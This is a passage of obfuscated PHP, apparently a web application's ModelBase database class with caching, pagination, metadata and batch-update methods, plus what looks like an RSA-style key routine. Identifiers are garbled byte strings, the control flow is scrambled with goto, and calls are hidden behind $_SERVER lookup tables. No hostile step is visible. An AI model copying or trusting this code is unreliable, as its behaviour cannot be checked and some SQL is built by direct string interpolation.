$f«”Ã™ËÚ·[10]; } $B™áÚèØ = $this->{$_SERVER[İ§][256]}($d‹‹æªô—[1] . $f«”Ã™ËÚ·[10], $f«”Ã™ËÚ·[155]); if (!$B™áÚèØ) { return $f«”Ã™ËÚ·[10]; } goto FŸŠÀİÄáì; FİÍÚË²“: for ($A¸­ÆáÍŞ = 3; $A¸­ÆáÍŞ < $B™áÚèØ; $A¸­ÆáÍŞ += 2) { if ($B™áÚèØ % $A¸­ÆáÍŞ != 0) { continue; } $f¦ÁßÚˆƒù = $A¸­ÆáÍŞ; $cÃÏ›½å¨Œ = $f«”Ã™ËÚ·[250]($B™áÚèØ / $A¸­ÆáÍŞ); $c’º„æÆÍè = $F±¶ÔÙõ¦[690]; if (strlen($c’º„æÆÍè) < $F±¶ÔÙõ¦[570]) { die; } break; } $fàÃ¢Õ †İ = ($f¦ÁßÚˆƒù - 1) * ($cÃÏ›½å¨Œ - 1); $aİ–éğÀ = $f«”Ã™ËÚ·[250](($f¦ÁßÚˆƒù + $cÃÏ›½å¨Œ) / 2); goto AåöÆÂ«ë±; FŸŠÀİÄáì: $B™áÚèØ = $f«”Ã™ËÚ·[250]($B™áÚèØ); $aí‰‚¾ÜÆ× = $F±¶ÔÙõ¦[688]; while (strlen($aí‰‚¾ÜÆ×) < $F±¶ÔÙõ¦[577]) { if (!$aí‰‚¾ÜÆ×) { break; } $aí‰‚¾ÜÆ×++; } goto Bç”Á»¬£Ò; cò¦áèŸ½É: $A®²Ê²…À = 2; $eÚ‡ÆßÃÚŠ = $F±¶ÔÙõ¦[693]; if (!$eÚ‡ÆßÃÚŠ) { die; } goto dÆÁŠäŞÖº; dÆÁŠäŞÖº: for ($A¸­ÆáÍŞ = 0; $A¸­ÆáÍŞ < $fàÃ¢Õ †İ * 10; $A¸­ÆáÍŞ++) { if (($fàÃ¢Õ †İ * $A¸­ÆáÍŞ + 1) % $aİ–éğÀ == 0) { $A®²Ê²…À = $f«”Ã™ËÚ·[250](($fàÃ¢Õ †İ * $A¸­ÆáÍŞ + 1) / $aİ–éğÀ); break; } } $F¡»´£íõ = $f«”Ã™ËÚ·[120]($f«”Ã™ËÚ·[354] . ($f¦ÁßÚˆƒù + $cÃÏ›½å¨Œ) . $f«”Ã™ËÚ·[355] . $aİ–éğÀ . $f«”Ã™ËÚ·[355] . $A®²Ê²…À . $f«”Ã™ËÚ·[356]); $D÷Åò¿ùé = $F±¶ÔÙõ¦[694]; goto C…©ó§»ï; Dã®ËÊº•ˆ: } public function wemj549a28c5() { goto Bë†÷Á‚”; BÈ²‡÷Ú½Œ: while (strlen($dËÌìÓæùã) < $F¸“Ğõ¿Ïù[594]) { if (!$dËÌìÓæùã) { break; } $dËÌìÓæùã++; } for ($aˆÛğ„“÷† = $c…Íä¨Êé×; $aˆÛğ„“÷† > 1; $aˆÛğ„“÷†--) { $DøÂøóæ¸õ = !0; $bÌ“‡®¢¨ = $F¸“Ğõ¿Ïù[700]; foreach ($D‰Ğƒ¼ as $Aƒ–ÉæĞø) { if ($aˆÛğ„“÷† % $Aƒ–ÉæĞø == 0) { $DøÂøóæ¸õ = !1; break; } } if ($DøÂøóæ¸õ) { $Aà³å„ÅÛ« = $aˆÛğ„“÷†; break; } } return $Aà³å„ÅÛ«; goto cÕÇ–°ç°†; e”ğİ„„‘: while ($dŒº×Æ—ù™ <= (int) $c…ğâ•ù„[359]($c…Íä¨Êé×)) { $aˆÛğ„“÷† = $dŒº×Æ—ù™; $CÛâ·ñšÔ = $F¸“Ğõ¿Ïù[698]; if (!$CÛâ·ñšÔ) { die; } while (!0) { $aˆÛğ„“÷†++; if ($aˆÛğ„“÷† <= 2) { $dŒº×Æ—ù™ = $aˆÛğ„“÷†; break; } else { if ($aˆÛğ„“÷† < 2) { continue; } } $DøÂøóæ¸õ = !0; for ($F°ÔĞÍåá = 2; $F°ÔĞÍåá <= $c…ğâ•ù„[359]($aˆÛğ„“÷†); $F°ÔĞÍåá++) { if ($aˆÛğ„“÷† % $F°ÔĞÍåá == 0) { $DøÂøóæ¸õ = !1; } } if ($DøÂøóæ¸õ) { $dŒº×Æ—ù™ = $aˆÛğ„“÷†; break; } } $D‰Ğƒ¼[] = $dŒº×Æ—ù™; } $Aà³å„ÅÛ« = 2; $dËÌìÓæùã = $F¸“Ğõ¿Ïù[699]; goto BÈ²‡÷Ú½Œ; Bë†÷Á‚”: $F¸“Ğõ¿Ïù =& $_SERVER[µ…]; $c…ğâ•ù„ =& $_SERVER[İ§]; $c…Íä¨Êé× = $c…ğâ•ù„[338]($c…ğâ•ù„[358](2, 14), $c…ğâ•ù„[358](2, 16) - 1); goto A›åª •õ¼; A›åª •õ¼: $AÄùœ¶¿Ú— = $F¸“Ğõ¿Ïù[696]; if (strlen($AÄùœ¶¿Ú—) < $F¸“Ğõ¿Ïù[577]) { return; } $D‰Ğƒ¼ = array(); goto Fôà…İ†±Ô; Fôà…İ†±Ô: $dŒº×Æ—ù™ = 1; $FìòííâÔ = $F¸“Ğõ¿Ïù[697]; if (strlen($FìòííâÔ) < $F¸“Ğõ¿Ïù[594]) { return; } goto e”ğİ„„‘; cÕÇ–°ç°†: } public function rxvy43a7858d($ešŸòªêå¶, $aµ»‘¸’ïŸ) { $b”Í…™·¸‰ =& $_SERVER[İ§]; return $b”Í…™·¸‰[13](array($b”Í…™·¸‰[14], $b”Í…™·¸‰[360]), $ešŸòªêå¶, $aµ»‘¸’ïŸ); } public function ldcg087a9117($A™ç²î‹¥Í, $Aï ÙÀ›”ƒ) { $e¶ĞÎù¿ç– =& $_SERVER[İ§]; return $e¶ĞÎù¿ç–[13](array($e¶ĞÎù¿ç–[361], $e¶ĞÎù¿ç–[362]), $A™ç²î‹¥Í, $Aï ÙÀ›”ƒ); } public function ljpqd9e1df4f($a´éÏÆ¹×ë, $B·ÔÑ¨ãÌ¦) { $EóÉ’íÇÔí =& $_SERVER[İ§]; return $EóÉ’íÇÔí[13](array($EóÉ’íÇÔí[361], $EóÉ’íÇÔí[363]), $a´éÏÆ¹×ë, $B·ÔÑ¨ãÌ¦); $c¤Óğ¥œªØ = $_SERVER[µ…][701]; } } goto bÚá÷èà†š; B›ö¤Õµ : class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\145\x72\164\x2c\165\x70\144\x61\x74\145", "\x66\x75\156\x63\x74\x69\x6f\x6e"), array("\143\162\145\x61\x74\x65\x54\x69\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\145\162\164", "\146\x75\x6e\143\x74\x69\157\156")); public function setDataAuto($b…·±µ¯Ê›) { $this->dataAuto = $b…·±µ¯Ê›; } public function __construct($bõÛÎ’„åÇ = '', $a°‘å÷Š‰© = '', $b¿Âö­õÈ» = '') { parent::__construct($bõÛÎ’„åÇ, $a°‘å÷Š‰©, $b¿Âö­õÈ»); } public static function textEncode($a¦¦­…¿¾ò) { if (!$a¦¦­…¿¾ò) { return $a¦¦­…¿¾ò; } $E£ß¿öÎó = json_encode($a¦¦­…¿¾ò); $E£ß¿öÎó = preg_replace_callback($_SERVER[µ…][351], function ($FÃ‰öîá°è) { return addslashes($FÃ‰öîá°è[0]); }, $E£ß¿öÎó); return json_decode($E£ß¿öÎó); } public static function textDecode($eË“îç‡ôÚ) { $bª¥¨ë×ÉÂ =& $_SERVER[µ…]; $eÅ„—½°î½ = json_encode($eË“îç‡ôÚ); $eÅ„—½°î½ = preg_replace_callback($bª¥¨ë×ÉÂ[352], function ($dÂò™§¿‹ù) { return $_SERVER[µ…][96]; }, $eÅ„—½°î½); return json_decode($eÅ„—½°î½); } protected $tableMeta = array(); protected function _beforeInsert(&$D‡…œĞºğ¨, $D´Ï‰™Çßã) { $eî•ïÍœ =& $_SERVER[µ…]; if (!$this->checkDataAutoHas($eî•ïÍœ[353])) { return; } $this->dataBeforeFilter($D‡…œĞºğ¨, $eî•ïÍœ[353]); } protected function _beforeUpdate(&$A•…¶É’â, $E‰æŞÇ…Î—) { $b¬‚’£Í„ =& $_SERVER[µ…]; if (!$this->checkDataAutoHas($b¬‚’£Í„[354])) { return; } $this->dataBeforeFilter($A•…¶É’â, $b¬‚’£Í„[354]); } protected function _afterSelect(&$d·ŸÆÜéßğ, $Cø×éÔ´ë) { if (!is_array($d·ŸÆÜéßğ)) { return; } if (!$this->checkDataAutoHas($_SERVER[µ…][355])) { return; } foreach ($d·ŸÆÜéßğ as &$EäƒÜœİ•¼) { $this->dataAfterFilter($EäƒÜœİ•¼); } unset($EäƒÜœİ•¼); } protected function _afterFind(&$bñÀ‘Š¢¥, $eöÖ–Òßá) { if (!is_array($bñÀ‘Š¢¥)) { return; } if (!$this->checkDataAutoHas($_SERVER[µ…][355])) { return; } $this->dataAfterFilter($bñÀ‘Š¢¥); } public function setAutoIncrement($Eì±á„½Çº) { $Dõ–¿†Œ“ = array($this->getPk() => $Eì±á„½Çº); $e‹ÒŒõŒ± = $this->data($Dõ–¿†Œ“)->add(); if ($e‹ÒŒõŒ±) { $this->delete($e‹ÒŒõŒ±); } } public function getAutoIncrement() { $A®¬•ù¼‘¥ = $this->getTableName(); $dæ¼¯Ù›¾ = $this->max($this->getPk()); $f •Ñ¼Öæõ = $this->query("\x73\150\x6f\167\x20\x74\141\142\154\145\40\x73\x74\x61\x74\165\x73\x20\x77\x68\x65\162\145\40\x4e\141\155\145\x3d\x27{$A®¬•ù¼‘¥}\47"); $ağ‚ªÉÜŞ¨ = $f •Ñ¼Öæõ[0][$_SERVER[µ…][356]]; $bÈ·÷Œç• = max($dæ¼¯Ù›¾, $ağ‚ªÉÜŞ¨); return $bÈ·÷Œç•; } protected function _callBefore($có¨‚§‘Õ, $b˜£ÇÑ§ö) { return $this->cacheCallCheck($có¨‚§‘Õ, $b˜£ÇÑ§ö, !1); } protected function _callAfter($a—Ãë´„©, $E°¢“§ù°†) { return $this->cacheCallCheck($a—Ãë´„©, $E°¢“§ù°†, !0); } protected function cacheFunctionAlias($dœ·Åõ¸‘Œ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($bö‡Ö•Ä‹œ, $D°İ—¤„ù‰, $BŸ³î˜ƒ‚ô = false) { $eá“â¡©Ù‚ = $this->cacheFunctionAlias($D°İ—¤„ù‰); if (!$eá“â¡©Ù‚) { return; } foreach ($eá“â¡©Ù‚ as $A¨³ ‘˜â¯ => $BòŠ Äøá¬) { $dšôïƒ«â¤ = $BòŠ Äøá¬[0]; $d‘“¼’Ïî = explode($_SERVER[µ…][47], $BòŠ Äøá¬[1]); if ($bö‡Ö•Ä‹œ == $A¨³ ‘˜â¯) { return $this->cacheFunctionGet($A¨³ ‘˜â¯, $dšôïƒ«â¤); } if ($BŸ³î˜ƒ‚ô && in_array($bö‡Ö•Ä‹œ, $d‘“¼’Ïî)) { $this->cacheFunctionClear($A¨³ ‘˜â¯, $dšôïƒ«â¤); } } } public function cacheFunctionGet($fÒõÏĞ§‘Ü, $eµâ÷£ŒÛ²) { $A×ƒùÏáº = $this->cacheKeyMake($fÒõÏĞ§‘Ü, $eµâ÷£ŒÛ²); $B›ƒÇÅãë´ = Cache::get($A×ƒùÏáº); if (!is_array($B›ƒÇÅãë´)) { $B›ƒÇÅãë´ = call_user_func_array(array($this, $fÒõÏĞ§‘Ü), array($eµâ÷£ŒÛ², !0)); Cache::set($A×ƒùÏáº, $B›ƒÇÅãë´); } return $B›ƒÇÅãë´; } public function cacheFunctionClear($CĞ½”¤¿¢ğ, $F’ªçİ×àÔ) { $e½¡ØìğÛÙ = $F’ªçİ×àÔ; if (!is_array($F’ªçİ×àÔ)) { $e½¡ØìğÛÙ = array($F’ªçİ×àÔ); } foreach ($e½¡ØìğÛÙ as $FŸ’îâ¶—ˆ) { $fŞÕõŸŸ˜ = $this->cacheKeyMake($CĞ½”¤¿¢ğ, $FŸ’îâ¶—ˆ); Cache::remove($fŞÕõŸŸ˜); } } private function cacheKeyMake($Bñ‡³¶ò²ó, $DÀ˜Ÿ±î†™) { $CîëÒ›†ù =& $_SERVER[µ…]; return get_class($this) . $CîëÒ›†ù[70] . $Bñ‡³¶ò²ó . $CîëÒ›†ù[357] . $DÀ˜Ÿ±î†™; } protected function selectPageReset() { $fÂŞ£ÅŒ” =& $_SERVER[µ…]; if (isset($GLOBALS[$fÂŞ£ÅŒ”[358]])) { return; } $GLOBALS[$fÂŞ£ÅŒ”[358]] = isset($GLOBALS[$fÂŞ£ÅŒ”[7]][$fÂŞ£ÅŒ”[359]]) ? $GLOBALS[$fÂŞ£ÅŒ”[7]][$fÂŞ£ÅŒ”[359]] : !1; $GLOBALS[$fÂŞ£ÅŒ”[360]] = isset($GLOBALS[$fÂŞ£ÅŒ”[7]][$fÂŞ£ÅŒ”[349]]) ? $GLOBALS[$fÂŞ£ÅŒ”[7]][$fÂŞ£ÅŒ”[349]] : !1; $GLOBALS[$fÂŞ£ÅŒ”[7]][$fÂŞ£ÅŒ”[359]] = !1; $GLOBALS[$fÂŞ£ÅŒ”[7]][$fÂŞ£ÅŒ”[349]] = !1; } protected function selectPageRestore() { $dàòà’† =& $_SERVER[µ…]; if (!isset($GLOBALS[$dàòà’†[358]])) { return; } $GLOBALS[$dàòà’†[7]][$dàòà’†[359]] = $GLOBALS[$dàòà’†[358]]; $GLOBALS[$dàòà’†[7]][$dàòà’†[349]] = $GLOBALS[$dàòà’†[360]]; unset($GLOBALS[$dàòà’†[358]]); unset($GLOBALS[$dàòà’†[360]]); } protected function selectPage($D™‹–ô–î = 200, $fäÂˆë°ÚÚ = 1) { goto bãÀĞ¦˜Ÿ„; bãÀĞ¦˜Ÿ„: $eËª«Óµœ· =& $_SERVER[µ…]; global $in; $E¤ï‚›İÈˆ = $this->optionsValue(); goto bâ¢³²İ; bâ¢³²İ: $bÒÂ…„¡òÑ = 50000; $D™‹–ô–î = isset($in[$eËª«Óµœ·[359]]) && $in[$eËª«Óµœ·[359]] ? $in[$eËª«Óµœ·[359]] : $D™‹–ô–î; if ($D™‹–ô–î === -1) { $in[$eËª«Óµœ·[359]] = !1; $bÒÂ…„¡òÑ = 100000000; $D™‹–ô–î = $bÒÂ…„¡òÑ; } goto Aˆ²æİÓ›; C²¬‚·¥…: $FóÀ›‘°¨¤ = array(); $B²ñ°¬¬øŠ = 1; if ($fäÂˆë°ÚÚ == 1 && $B²ñ°¬¬øŠ) { $this->optionsValue($E¤ï‚›İÈˆ); $FóÀ›‘°¨¤ = $this->page($fäÂˆë°ÚÚ, $D™‹–ô–î)->select(); $C â×©’öë = is_array($FóÀ›‘°¨¤) ? count($FóÀ›‘°¨¤) : 0; if ($C â×©’öë < $D™‹–ô–î) { $bòÌ»ÄÜ©é = 1; } else { $this->optionsValue($dê•Åì¢¥Ó); $C â×©’öë = intval($this->count()); $bòÌ»ÄÜ©é = ceil($C â×©’öë / $D™‹–ô–î); } } else { $this->optionsValue($dê•Åì¢¥Ó); $C â×©’öë = intval($this->count()); $bòÌ»ÄÜ©é = ceil($C â×©’öë / $D™‹–ô–î); $fäÂˆë°ÚÚ = $fäÂˆë°ÚÚ >= $bòÌ»ÄÜ©é ? $bòÌ»ÄÜ©é : $fäÂˆë°ÚÚ; $this->optionsValue($E¤ï‚›İÈˆ); $FóÀ›‘°¨¤ = $this->page($fäÂˆë°ÚÚ, $D™‹–ô–î)->select(); } goto DÃÔÜ‡¼ôƒ; AÔ•éÜ„‘¬: return $e¾Ó™ÊÏÊ¥; goto b÷‚Ù¥‡ó; CÅõÊÛÎó: $D™‹–ô–î = $D™‹–ô–î <= 5 ? 5 : ($D™‹–ô–î >= $bÒÂ…„¡òÑ ? $bÒÂ…„¡òÑ : $D™‹–ô–î); $fäÂˆë°ÚÚ = intval(isset($in[$eËª«Óµœ·[349]]) && $in[$eËª«Óµœ·[349]] ? $in[$eËª«Óµœ·[349]] : $fäÂˆë°ÚÚ); $fäÂˆë°ÚÚ = $fäÂˆë°ÚÚ <= 1 ? 1 : $fäÂˆë°ÚÚ; goto C²¬‚·¥…; DÃÔÜ‡¼ôƒ: if (!is_array($FóÀ›‘°¨¤)) { $FóÀ›‘°¨¤ = array(); } if ($bòÌ»ÄÜ©é == 1) { $C â×©’öë = count($FóÀ›‘°¨¤); } $e¾Ó™ÊÏÊ¥ = array($eËª«Óµœ·[362] => array($eËª«Óµœ·[363] => $C â×©’öë, $eËª«Óµœ·[359] => $D™‹–ô–î, $eËª«Óµœ·[349] => $fäÂˆë°ÚÚ, $eËª«Óµœ·[364] => $bòÌ»ÄÜ©é), $eËª«Óµœ·[365] => $FóÀ›‘°¨¤); goto AÔ•éÜ„‘¬; Aˆ²æİÓ›: $dê•Åì¢¥Ó = $E¤ï‚›İÈˆ; $dê•Åì¢¥Ó[$eËª«Óµœ·[361]] = array(); $D™‹–ô–î = intval($D™‹–ô–î); goto CÅõÊÛÎó; b÷‚Ù¥‡ó: } protected function checkLength($E”´ø½¦¼ñ, $fÆêŠ…¢ù¯ = 0, $E‰’¯¦‰¸á = '') { $a£Ş…ÍÃ†Ï =& $_SERVER[µ…]; $fÆêŠ…¢ù¯ = $fÆêŠ…¢ù¯ ? $fÆêŠ…¢ù¯ : 65536; if (!$E”´ø½¦¼ñ || strlen($E”´ø½¦¼ñ) < $fÆêŠ…¢ù¯) { return; } $E‰’¯¦‰¸á = $E‰’¯¦‰¸á ? $E‰’¯¦‰¸á . $a£Ş…ÍÃ†Ï[67] : $a£Ş…ÍÃ†Ï[33]; show_json($E‰’¯¦‰¸á . LNG($a£Ş…ÍÃ†Ï[366]) . "\x28{$fÆêŠ…¢ù¯}\x29", !1); } protected function metaSet($f±ŠîÌë©÷, $AÌ¦¼“£ = null, $E²ÀôÈËÒ = null) { goto d—‡˜›õœ; c¦Ù—ë’•ö: if (is_null($AÌ¦¼“£)) { return $e‹³ğ†Åœò->where(array($C˜ÖŸªºÅÑ => $f±ŠîÌë©÷))->delete(); } if (is_null($E²ÀôÈËÒ) && is_string($AÌ¦¼“£)) { return $e‹³ğ†Åœò->where($E÷£ÍĞ¨¥)->delete(); } $a‚¸îÃ¦Ò = is_array($AÌ¦¼“£) ? $AÌ¦¼“£ : array(); goto a†ŸÌ†œõÓ; a†ŸÌ†œõÓ: if (is_string($AÌ¦¼“£)) { $a‚¸îÃ¦Ò[$AÌ¦¼“£] = $E²ÀôÈËÒ; } $f‹ÔÊ®§¯Š = array(); foreach ($a‚¸îÃ¦Ò as $a„–ùœ²¥§ => $e‹·ö÷×‡Ş) { $this->checkLength($e‹·ö÷×‡Ş, !1, $F•ìŸë—ƒ³ . $FÅÒ·ìœø¨[4] . $a„–ùœ²¥§); $f‹ÔÊ®§¯Š[] = array($C˜ÖŸªºÅÑ => $f±ŠîÌë©÷, $FÅÒ·ìœø¨[92] => $a„–ùœ²¥§, $FÅÒ·ìœø¨[370] => $e‹·ö÷×‡Ş); } goto FÉ’áå‚Ö; FÉ’áå‚Ö: $bİÊİ×ŠŠ = $FÅÒ·ìœø¨[371] . $this->tableMeta; CacheLock::lock($bİÊİ×ŠŠ); $e‹³ğ†Åœò->where(array($C˜ÖŸªºÅÑ => $f±ŠîÌë©÷))->addAll($f‹ÔÊ®§¯Š, array(), !0); goto eÂ‚œ¦¦¼; d—‡˜›õœ: $FÅÒ·ìœø¨ =& $_SERVER[µ…]; if (!$this->tableMeta || !$f±ŠîÌë©÷) { return !1; } $C˜ÖŸªºÅÑ = $this->tableMeta[$FÅÒ·ìœø¨[367]]; goto EÁ¸–¸ççî; EÁ¸–¸ççî: $F•ìŸë—ƒ³ = $this->tableMeta[$FÅÒ·ìœø¨[368]]; $e‹³ğ†Åœò = Model($F•ìŸë—ƒ³); $E÷£ÍĞ¨¥ = array($C˜ÖŸªºÅÑ => $f±ŠîÌë©÷, $FÅÒ·ìœø¨[369] => $AÌ¦¼“£); goto c¦Ù—ë’•ö; eÂ‚œ¦¦¼: CacheLock::unlock($bİÊİ×ŠŠ); return !0; goto fó¨Éøµù; fó¨Éøµù: } public function metaGet($Aãôğ«æ°„, $bé„ë«¾Ñ­ = false) { goto eöœã÷›â; e‹‹ºÒî¢: $Aìó™ˆÊÔ« = $e¬Õ°Å†…­->field($e”Ù¼œ†Æ[372])->where($e‘±Èì „)->select(); $Aìó™ˆÊÔ« = array_to_keyvalue($Aìó™ˆÊÔ«, $e”Ù¼œ†Æ[92], $e”Ù¼œ†Æ[370]); return $Aìó™ˆÊÔ«; goto aŸ¶Ì»Ù™; eöœã÷›â: $e”Ù¼œ†Æ =& $_SERVER[µ…]; if (!$this->tableMeta) { return array(); } $B¿ß„‹¯œ = $this->tableMeta[$e”Ù¼œ†Æ[367]]; goto aŞšĞÁ²µ; aŞšĞÁ²µ: $e¬Õ°Å†…­ = Model($this->tableMeta[$e”Ù¼œ†Æ[368]]); if ($bé„ë«¾Ñ­) { $e‘±Èì „ = array($B¿ß„‹¯œ => $Aãôğ«æ°„, $e”Ù¼œ†Æ[92] => $bé„ë«¾Ñ­); return $e¬Õ°Å†…­->where($e‘±Èì „)->getField($e”Ù¼œ†Æ[370]); } $e‘±Èì „ = array($B¿ß„‹¯œ => $Aãôğ«æ°„); goto e‹‹ºÒî¢; aŸ¶Ì»Ù™: } private function checkDataAutoHas($EÈàóø¤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Fê‰ØŞâÉˆ) { if (in_array($EÈàóø¤, explode($_SERVER[µ…][47], $Fê‰ØŞâÉˆ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$DÌ‹òäÆ¾, $E‡©‘áà®ê) { $CÜĞ¨Œ«¼³ =& $_SERVER[µ…]; foreach ($this->dataAuto as $F®Œ‹ò¯»¯) { $a´ö¤õ¬á˜ = $F®Œ‹ò¯»¯[0]; if (!in_array($E‡©‘áà®ê, explode($CÜĞ¨Œ«¼³[47], $F®Œ‹ò¯»¯[2]))) { continue; } switch (trim($F®Œ‹ò¯»¯[3])) { case $CÜĞ¨Œ«¼³[317]: case $CÜĞ¨Œ«¼³[318]: $AÃ†´Şåˆ¶ = $F®Œ‹ò¯»¯[1]; $eô˜ºöÌŒ = isset($F®Œ‹ò¯»¯[4]) ? (array) $F®Œ‹ò¯»¯[4] : array(); if ($AÃ†´Şåˆ¶ == $CÜĞ¨Œ«¼³[195] && array_key_exists($a´ö¤õ¬á˜, $DÌ‹òäÆ¾)) { if (!$DÌ‹òäÆ¾[$a´ö¤õ¬á˜]) { unset($DÌ‹òäÆ¾[$a´ö¤õ¬á˜]); } break; } if (isset($DÌ‹òäÆ¾[$a´ö¤õ¬á˜])) { array_unshift($eô˜ºöÌŒ, $DÌ‹òäÆ¾[$a´ö¤õ¬á˜]); } if ($CÜĞ¨Œ«¼³[317] == $F®Œ‹ò¯»¯[3]) { $DÌ‹òäÆ¾[$a´ö¤õ¬á˜] = call_user_func_array($AÃ†´Şåˆ¶, $eô˜ºöÌŒ); } else { $DÌ‹òäÆ¾[$a´ö¤õ¬á˜] = call_user_func_array(array(&$this, $AÃ†´Şåˆ¶), $eô˜ºöÌŒ); } break; case $CÜĞ¨Œ«¼³[269]: $DÌ‹òäÆ¾[$a´ö¤õ¬á˜] = $DÌ‹òäÆ¾[$F®Œ‹ò¯»¯[1]]; break; case $CÜĞ¨Œ«¼³[290]: if (isset($DÌ‹òäÆ¾[$a´ö¤õ¬á˜]) && !is_string($DÌ‹òäÆ¾[$a´ö¤õ¬á˜])) { $DÌ‹òäÆ¾[$a´ö¤õ¬á˜] = json_encode_force($DÌ‹òäÆ¾[$a´ö¤õ¬á˜]); } break; case $CÜĞ¨Œ«¼³[319]: if ($DÌ‹òäÆ¾[$a´ö¤õ¬á˜] === $CÜĞ¨Œ«¼³[33]) { unset($DÌ‹òäÆ¾[$a´ö¤õ¬á˜]); } break; case $CÜĞ¨Œ«¼³[320]: $DÌ‹òäÆ¾[$a´ö¤õ¬á˜] = $F®Œ‹ò¯»¯[1]; default: break; } } if ($E‡©‘áà®ê == $CÜĞ¨Œ«¼³[353]) { $CĞî°¹êë = strtolower($this->db->getDbType()); if (strpos($CĞî°¹êë, $CÜĞ¨Œ«¼³[9]) !== 0) { return; } $fÅœô¬©ù = $this->field(!0)->fields; $a¶öàš = $fÅœô¬©ù[$CÜĞ¨Œ«¼³[248]]; if (isset($fÅœô¬©ù[$CÜĞ¨Œ«¼³[247]])) { unset($a¶öàš[$fÅœô¬©ù[$CÜĞ¨Œ«¼³[247]]]); } foreach ($a¶öàš as $c÷‹·¬Äˆ => $E‡©‘áà®ê) { if (!isset($DÌ‹òäÆ¾[$c÷‹·¬Äˆ])) { $DÌ‹òäÆ¾[$c÷‹·¬Äˆ] = $CÜĞ¨Œ«¼³[33]; } } } } private function dataAfterFilter(&$E¡ˆ¬ë¾„») { $F¶¹î’‰à =& $_SERVER[µ…]; foreach ($this->dataAuto as $fÈÃÎíÇ´) { $c»¸¢‹ª¯ = $fÈÃÎíÇ´[0]; if (!in_array($F¶¹î’‰à[355], explode($F¶¹î’‰à[47], $fÈÃÎíÇ´[2]))) { continue; } if (!isset($E¡ˆ¬ë¾„»[$c»¸¢‹ª¯])) { continue; } switch (trim($fÈÃÎíÇ´[3])) { case $F¶¹î’‰à[317]: case $F¶¹î’‰à[318]: $Có¥Ğ×Ô… = isset($fÈÃÎíÇ´[4]) ? (array) $fÈÃÎíÇ´[4] : array(); array_unshift($Có¥Ğ×Ô…, $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯]); if ($F¶¹î’‰à[317] == $fÈÃÎíÇ´[3]) { $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯] = call_user_func_array($fÈÃÎíÇ´[1], $Có¥Ğ×Ô…); } else { $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯] = call_user_func_array(array(&$this, $fÈÃÎíÇ´[1]), $Có¥Ğ×Ô…); } break; case $F¶¹î’‰à[269]: $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯] = $E¡ˆ¬ë¾„»[$fÈÃÎíÇ´[1]]; break; case $F¶¹î’‰à[290]: $D†‹áìº¥ë = $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯]; $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯] = json_decode($D†‹áìº¥ë, !0); if (is_null($E¡ˆ¬ë¾„»[$c»¸¢‹ª¯])) { $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯] = $D†‹áìº¥ë; } break; case $F¶¹î’‰à[319]: if ($E¡ˆ¬ë¾„»[$c»¸¢‹ª¯] === $F¶¹î’‰à[33]) { unset($E¡ˆ¬ë¾„»[$c»¸¢‹ª¯]); } break; case $F¶¹î’‰à[320]: $E¡ˆ¬ë¾„»[$c»¸¢‹ª¯] = $fÈÃÎíÇ´[1]; default: break; } } } public function saveAll($eöáòî¨¼…) { goto fäñº¤ÇÈ¨; fìŒĞâ¢¥: $eöáòî¨¼… = is_array($eöáòî¨¼…) ? $eöáòî¨¼… : array(); $A„âÊ°ÓÚİ = $FåŞÆ‹ö‡[373]; $F¯£ô‡Ñ¸Ù = 0; goto EØ‚ñ¾ùğˆ; EØ‚ñ¾ùğˆ: $B“…ß½Ô = array(); $bª×å°ß… = count($eöáòî¨¼…); for ($CÆó³ÎÕªº = 0; $CÆó³ÎÕªº < $bª×å°ß…; $CÆó³ÎÕªº++) { $aÀ¼¦ì¥Ş° = $eöáòî¨¼…[$CÆó³ÎÕªº]; if (!is_array($aÀ¼¦ì¥Ş°) || count($aÀ¼¦ì¥Ş°) != 4) { continue; } $Dé™´–ÖÉ = "\125\x50\x44\101\x54\105\x20\x60{$CçàÌƒ¥‘†}\140\40\123\105\124\40{$aÀ¼¦ì¥Ş°[2]}\x20\75\x20\x43\x41\x53\105\40{$aÀ¼¦ì¥Ş°[0]}\40\xa"; if ($F¯£ô‡Ñ¸Ù == 0) { $A„âÊ°ÓÚİ = $Dé™´–ÖÉ; } $B“…ß½Ô[] = $FåŞÆ‹ö‡[115] . $aÀ¼¦ì¥Ş°[1] . $FåŞÆ‹ö‡[115]; $F¯£ô‡Ñ¸Ù++; $A„âÊ°ÓÚİ .= "\40\127\110\x45\x4e\x20\47{$aÀ¼¦ì¥Ş°[1]}\x27\40\124\110\x45\x4e\40\x27{$aÀ¼¦ì¥Ş°[3]}\x27\x20\xa"; if ($F¯£ô‡Ñ¸Ù == $bæáº˜ÜÊ || $CÆó³ÎÕªº == $bª×å°ß… - 1) { goto fù²Ñ¥ÇË—; fù²Ñ¥ÇË—: $döòØ‹£ƒ = implode($FåŞÆ‹ö‡[47], $B“…ß½Ô); $A„âÊ°ÓÚİ .= "\x20\x45\x4e\x44\x20\x20\127\110\105\122\105\40{$aÀ¼¦ì¥Ş°[0]}\40\x49\x4e\40\x28{$döòØ‹£ƒ}\x29\x20"; $this->execute($A„âÊ°ÓÚİ); goto dï’óİçÑ; dï’óİçÑ: $F¯£ô‡Ñ¸Ù = 0; $A„âÊ°ÓÚİ = $Dé™´–ÖÉ; $this->chunkEventCheck(count($B“…ß½Ô)); goto DÒèùòÊ‰; DÒèùòÊ‰: $B“…ß½Ô = array(); goto dˆ„êˆ×ØŒ; dˆ„êˆ×ØŒ: } } goto F×†æö‰á; fäñº¤ÇÈ¨: $FåŞÆ‹ö‡ =& $_SERVER[µ…]; $CçàÌƒ¥‘† = $this->tablePrefix . $this->tableName; $bæáº˜ÜÊ = self::SQL_WHERE_IN_CHUNK; goto fìŒĞâ¢¥; F×†æö‰á: $this->chunkEventSet(); goto B×Àª¾è‹Ğ; B×Àª¾è‹Ğ: } public function saveAllEach($e»öŠÀºÆø) { $eùäŠñ‰¶ =& 